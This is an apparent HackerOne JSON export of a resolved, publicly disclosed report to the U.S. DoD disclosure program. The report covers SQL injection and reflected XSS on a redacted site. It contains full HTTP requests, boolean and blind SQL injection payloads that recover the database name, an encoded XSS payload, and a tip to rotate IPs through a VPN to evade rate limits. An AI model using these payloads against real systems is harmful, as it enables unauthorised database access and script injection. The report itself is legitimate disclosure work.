{"id":484801,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODQ4MDE=","url":"https://hackerone.com/reports/484801","title":"[███]  SQL injection \u0026 Reflected XSS","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-01-23T21:08:17.063Z","submitted_at":"2019-01-23T21:08:17.063Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jarvis7","url":"/jarvis7","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16064,"url":"https://hackerone.com/deptofdefense","handle":"deptofdefense","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"U.S. Dept Of Defense","twitter_handle":"DC3VDP","website":"https://bit.ly/2Rt5QhM","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-02T19:11:46.642Z","bug_reporter_agreed_on_going_public_at":"2019-02-11T16:50:27.853Z","team_member_agreed_on_going_public_at":"2019-12-02T19:11:46.532Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"###SQL injection test###\n\n1. Go to site [███████](http://█████/)\n2. Intercept this request\n\n```\nPOST /viewem6.php HTTP/1.1\nHost: ████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: ru,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://████████/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 28\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nrememail=test\u0026rememail2=test\n```\nSet this payload to param ```rememail```\n\n```\n' or '1'='1\n```\n\nor \n```\n' or true --+\n```\n█████████\n█████████\n\nBut if you set another payload \n```\n' or '1'='2\n```\n\nor \n```\n' or false --+\n```\n\n██████████\n███████\n\nAlso if you set payload\n```\n' union select 1--\n```\n\nYou will have another request\n█████\n\nI did not begin to extract any data about the server or database, since this may be contrary to the rules.\n\n###Reflected XSS###\n\nUsing this payload I can execute XSS\n\n```\n' or '\"\u003cscript\u003ealert(1)\u003c/script\u003e'='\"\u003cscript\u003ealert(1)\u003c/script\u003e\n```\n\nYou need to encode this payload\n\n```\n%27 or %27\"\u003cscript\u003ealert(1)\u003c/script\u003e%27=%27\"\u003cscript\u003ealert(1)\u003c/script\u003e\n```\n\nResult in Burp\n█████\n\n## Impact\n\nUsing this bug hacker can get access to database of server, also hacker can exploit XSS injection.","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":7,"voters":["daehee","chita","eveeez","dastan_9408","armansameer","amckee","yoflow"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4026942,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Greetings from the Department of Defense (DoD),\n\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\n\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\n\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.\n\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\n\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\n\nRegards,\n\nThe VDP Team","automated_response":true,"created_at":"2019-01-23T21:08:17.534Z","updated_at":"2019-01-23T21:08:17.534Z","actor":{"url":"/deptofdefense","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"U.S. Dept Of Defense"}},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4031039,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Can't get any of your PoCs to work.  Getting \"exceeded the number of delete\" when I try to run everything including the XSS.  ","automated_response":false,"created_at":"2019-01-24T13:00:26.060Z","updated_at":"2019-01-24T13:00:26.060Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4031055,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @ag3nt-j1! Forgot to mention. If you are testing this site, there is a limitation on it. Only three queries can be executed from one IP. Change your IP using some VPN or Proxy)","automated_response":false,"created_at":"2019-01-24T13:03:07.936Z","updated_at":"2019-01-24T13:03:07.936Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4031255,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"LOL I was afraid of that.  I'll have this one triaged a little later today.  At home it's pretty quick to flip my VPN, here at the office it takes a bit more time.  Seems valid, just want to run your whole PoC.","automated_response":false,"created_at":"2019-01-24T13:54:59.943Z","updated_at":"2019-01-24T13:54:59.943Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4031260,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Yep, didn't mean to set it as triaged yet...","automated_response":false,"created_at":"2019-01-24T13:55:53.431Z","updated_at":"2019-01-24T13:55:53.431Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4031273,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay, whait..","automated_response":false,"created_at":"2019-01-24T13:57:22.564Z","updated_at":"2019-01-24T13:57:22.564Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4036718,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-01-25T12:37:01.689Z","updated_at":"2019-01-25T12:37:01.689Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":286291},"actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4036719,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\n\nThanks again for supporting the DoD Vulnerability Disclosure Program.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2019-01-25T12:37:02.403Z","updated_at":"2019-01-25T12:37:02.403Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4036724,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jarvis7 I'm setting this finding to a medium.  If you can actually get this to dump something more will be happy to up the severity.","automated_response":false,"created_at":"2019-01-25T12:37:52.767Z","updated_at":"2019-01-25T12:37:52.767Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4037741,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ag3nt-j1  hi!\n\nokay) This is blind SQL injection. So you can use this vector\n\n```\n' or  (select ascii(substr(database(),1,1))  \u003c \u003cN\u003e ) --+\n```\n\nIf sql  expression is successful, the answer will be:\n███\n\nIf not success\n███\n\nFor PoC of my vector I will get full database name.\n\nFirst char\n```\n' or  (select ascii(substr(database(),1,1))  = 109 ) --+\n```\n\nSecond char\n\n```\n' or  (select ascii(substr(database(),2,1))  = 116  ) --+\n```\n\nand so on..\n\n109 - m\n116 - t\n108 - l\n105 - i\n115 - s\n116 - t\n\n\nFull name of database is  ```mtlist```\n\nExploit for check name of database:\n```\n' or  (select database()=\"mtlist\") --+\n```\n\nFull request:\n```\nPOST /viewem6.php HTTP/1.1\nHost: ████████\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: ru,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://██████████/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 60\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nrememail=' or  (select database()=\"mtlist\") --+\u0026rememail2=1\n```\n\n████\n","automated_response":false,"created_at":"2019-01-25T15:48:42.512Z","updated_at":"2019-10-11T13:42:58.206Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4044880,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ag3nt-j1!\n\nI have a question about scope. I have already asked it before in another report, but nobody answered me. \n\nTell me, which sites specifically get into scope? As I understand it now, these are all sites ```* .mil```. And what other sites are included? Can I see a list of all these sites somewhere?  What if I found a bug in the iris.custhelp.va.gov website? I do not quite understand the description of the program, so please clarify. \n\nThe problem is that if I send a report about a site in which I doubt, and it will be out of the scope - without any discussion triage team will give me N\\A. \n\nHelp please.\n\nThanks.","automated_response":false,"created_at":"2019-01-27T03:13:20.676Z","updated_at":"2019-01-27T03:13:20.676Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4049811,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jarvis7, we get a lot of automated emails though H1 so we will often miss when a reseacher makes a comment in a report.  So our scope includes all \"*.mil\" TLDs.  Occasionally there will be a .gov, .org, .edu, etc. that may fall within our scope.  Usually looking through the website you are testing will have that kind of disclosure somewhere on the site that would indicate it's a DoD website.  If you find a .gov you can always submit a report to https://www.us-cert.gov/forms/report.  As for a list of US DoD webites, we don't have a list.  DoD is probably has one of the largest internet footprints in the world.  ","automated_response":false,"created_at":"2019-01-28T12:21:55.486Z","updated_at":"2019-01-28T12:21:55.486Z","actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4049882,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ag3nt-j1 thanks!\n\nlook, I suggest this option. If I see that the site is related to DOD, but by itself * .gov, can i write something look like this and have Informative (if I'm wrong and site not in DoD scope)?\n\n```\nHi!\n\nI think this site refers to DoD. If not, please close the report as Informative.\n\nThanks!\n```\n\n\nP.S. What you can say about current bug ? :)","automated_response":false,"created_at":"2019-01-28T12:34:57.686Z","updated_at":"2019-01-28T12:38:01.110Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4129339,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Good news!\n\nThe vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.\n\nThank you for your time and effort to improve the security of the DoD information network.\n\nRegards,\n\nThe VDP Team","automated_response":false,"created_at":"2019-02-11T16:46:49.436Z","updated_at":"2019-02-11T16:46:49.436Z","actor":{"username":"ag3nt-z3","cleared":false,"url":"/ag3nt-z3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/214/876/fe8ed11e6713960f9085d7d7df31de3826125778_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jarvis7","url":"/jarvis7"},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4129357,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"disclose?","automated_response":false,"created_at":"2019-02-11T16:50:27.874Z","updated_at":"2019-02-11T16:50:27.874Z","first_to_agree":true,"actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4129375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":" @ag3nt-j1 did you recheck bug?","automated_response":false,"created_at":"2019-02-11T16:52:53.044Z","updated_at":"2019-02-11T16:52:53.044Z","actor":{"username":"jarvis7","cleared":false,"url":"/jarvis7","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/981/b2ac207af259985cde15c3291f708ea28bdbe37a_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6450652,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Approved for disclosure. Thanks for your participation in the DoD Vulnerability Disclosure Program (VDP). Please follow us on Twitter @DC3VDP","automated_response":false,"created_at":"2019-12-02T19:11:46.550Z","updated_at":"2019-12-02T19:11:46.550Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6450653,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-12-02T19:11:46.658Z","updated_at":"2019-12-02T19:11:46.658Z","actor":{"username":"agent-1","cleared":false,"url":"/agent-1","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/379/490/775a471f25ef037fbf277e8b5d5a50bbb9e9ab56_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}